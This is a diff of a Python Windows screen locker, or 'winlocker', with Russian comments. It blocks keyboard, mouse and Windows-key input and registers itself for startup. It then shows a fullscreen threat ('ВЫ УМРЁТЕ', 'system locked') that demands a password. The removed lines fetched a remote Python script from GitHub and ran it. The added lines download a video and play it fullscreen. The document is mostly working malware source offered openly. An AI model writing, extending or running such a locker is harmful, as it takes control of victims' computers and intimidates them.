@@ -1,12 +1,10 @@
-import ctypes, os, sys, time, threading, random, tempfile, urllib.request, tkinter as tk
+import ctypes, os, sys, time, threading, random, subprocess, urllib.request, tempfile, tkinter as tk
 
 # === НАСТРОЙКИ ===
 PASSWORD = "1601"
 TIMER_SECONDS = 15  # для теста, потом 600
-# Ссылка на генератор MP3-файла в моём репозитории
-MUSIC_GENERATOR_URL = "https://raw.githubusercontent.com/KaliToolsAcademy/music/main/generate_music.py"
-# Путь, куда сохранится твоя музыка
-MUSIC_FILE = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp", "winlocker_music.mp3")
+VIDEO_URL = "https://raw.githubusercontent.com/ippo123459-bit/winlocker/main/bg.mp4"
+VIDEO_FILE = os.path.join(tempfile.gettempdir(), "bg.mp4")
 
 # === БЛОКИРУЕМ КЛАВИАТУРУ И МЫШЬ ===
 def block_input(block=True):
@@ -40,36 +38,14 @@ def add_to_startup():
     except:
         pass
 
-# === ФУНКЦИЯ ДЛЯ ГЕНЕРАЦИИ МУЗЫКИ ===
-def generate_music_file():
-    """Скачивает и запускает генератор, который создаст MP3-файл с твоей музыкой."""
+# === СКАЧИВАЕМ И ЗАПУСКАЕМ ВИДЕО ===
+def play_video():
     try:
-        # Если файла нет, скачиваем генератор
-        generator_path = os.path.join(tempfile.gettempdir(), "generate_music.py")
-        if not os.path.exists(MUSIC_FILE):
-            urllib.request.urlretrieve(MUSIC_GENERATOR_URL, generator_path)
-            # Запускаем генератор
-            import subprocess
-            subprocess.run([sys.executable, generator_path], check=True)
-    except:
-        pass
-
-# === ИГРАЕМ МУЗЫКУ ===
-def play_music():
-    try:
-        # Убедимся, что файл существует, если нет — создадим
-        if not os.path.exists(MUSIC_FILE):
-            generate_music_file()
-        
-        if os.path.exists(MUSIC_FILE):
-            try:
-                import pygame.mixer as mixer
-                mixer.init()
-                mixer.music.load(MUSIC_FILE)
-                mixer.music.play(-1)
-                return
-            except:
-                pass
+        if not os.path.exists(VIDEO_FILE):
+            urllib.request.urlretrieve(VIDEO_URL, VIDEO_FILE)
+        vlc_path = r"C:\Program Files\VideoLAN\VLC\vlc.exe"
+        if os.path.exists(vlc_path):
+            subprocess.Popen([vlc_path, "--fullscreen", "--no-video-title-show", VIDEO_FILE])
     except:
         pass
 
@@ -78,14 +54,14 @@ def show_boot_animation():
     root = tk.Tk()
     root.attributes('-fullscreen', True)
     root.configure(bg='black')
-    lbl = tk.Label(root, text="", fg='#0f0', bg='black', font=('Courier', 36, 'bold'))
+    lbl = tk.Label(root, text="", fg='white', bg='black', font=('Courier', 36, 'bold'))
     lbl.pack(expand=True)
     bar = tk.Canvas(root, width=600, height=30, bg='black', highlightthickness=0)
     bar.pack(pady=20)
     for i in range(0, 101, 5):
         lbl.config(text=f"ВЗЛОМ ctOS 2.0: {i}%")
         bar.delete("progress")
-        bar.create_rectangle(10, 5, 10 + (i * 5.8), 25, fill='#0f0', tags="progress")
+        bar.create_rectangle(10, 5, 10 + (i * 5.8), 25, fill='white', tags="progress")
         root.update()
         time.sleep(0.15)
     time.sleep(0.5)
@@ -106,13 +82,13 @@ class WinLocker:
         self.canvas = tk.Canvas(self.win, bg='black', highlightthickness=0)
         self.canvas.pack(fill='both', expand=True)
         
-        self.canvas.create_text(400, 80, text="ВЫ УМРЁТЕ", fill='red', font=('Courier', 60, 'bold'), tags="title")
-        self.canvas.create_text(400, 160, text="СИСТЕМА ЗАБЛОКИРОВАНА", fill='red', font=('Courier', 36))
-        self.canvas.create_text(400, 300, text="ВВЕДИТЕ ПАРОЛЬ:", fill='red', font=('Courier', 28))
+        self.canvas.create_text(400, 80, text="ВЫ УМРЁТЕ", fill='white', font=('Courier', 60, 'bold'), tags="title")
+        self.canvas.create_text(400, 160, text="СИСТЕМА ЗАБЛОКИРОВАНА", fill='white', font=('Courier', 36))
+        self.canvas.create_text(400, 300, text="ВВЕДИТЕ ПАРОЛЬ:", fill='white', font=('Courier', 28))
         
-        self.entry = tk.Entry(self.win, show="*", font=('Courier', 28), bg='black', fg='red', insertbackground='red')
+        self.entry = tk.Entry(self.win, show="*", font=('Courier', 28), bg='black', fg='white', insertbackground='white')
         self.canvas.create_window(400, 360, window=self.entry)
-        self.status = self.canvas.create_text(400, 420, text="", fill='red', font=('Courier', 20))
+        self.status = self.canvas.create_text(400, 420, text="", fill='white', font=('Courier', 20))
         
         self.entry.bind('<Return>', self.check_password)
         self.entry.focus_set()
@@ -141,13 +117,18 @@ class WinLocker:
         ]
         y = 480
         for line in lines:
-            self.canvas.create_text(400 + x_offset, y + y_offset, text=line, fill='red', font=('Courier', 16), tags="skull")
+            self.canvas.create_text(400 + x_offset, y + y_offset, text=line, fill='white', font=('Courier', 16), tags="skull")
             y += 22
         
+        for _ in range(20):
+            x, y = random.randint(0, 800), random.randint(0, 600)
+            s = random.randint(2, 4)
+            self.canvas.create_oval(x, y, x+s, y+s, fill='white', outline='white', tags="particle")
+        
         if random.random() < 0.1:
-            self.canvas.itemconfig("title", fill='#0f0')
+            self.canvas.itemconfig("title", fill='gray')
         else:
-            self.canvas.itemconfig("title", fill='red')
+            self.canvas.itemconfig("title", fill='white')
         self.win.after(50, self.animate)
 
 # === ЗАПУСК ===
@@ -157,7 +138,7 @@ if __name__ == "__main__":
     time.sleep(TIMER_SECONDS)
     block_input(True)
     threading.Thread(target=block_win_key, daemon=True).start()
-    threading.Thread(target=play_music, daemon=True).start()
+    threading.Thread(target=play_video, daemon=True).start()
     show_boot_animation()
     app = WinLocker()
     app.root.mainloop()
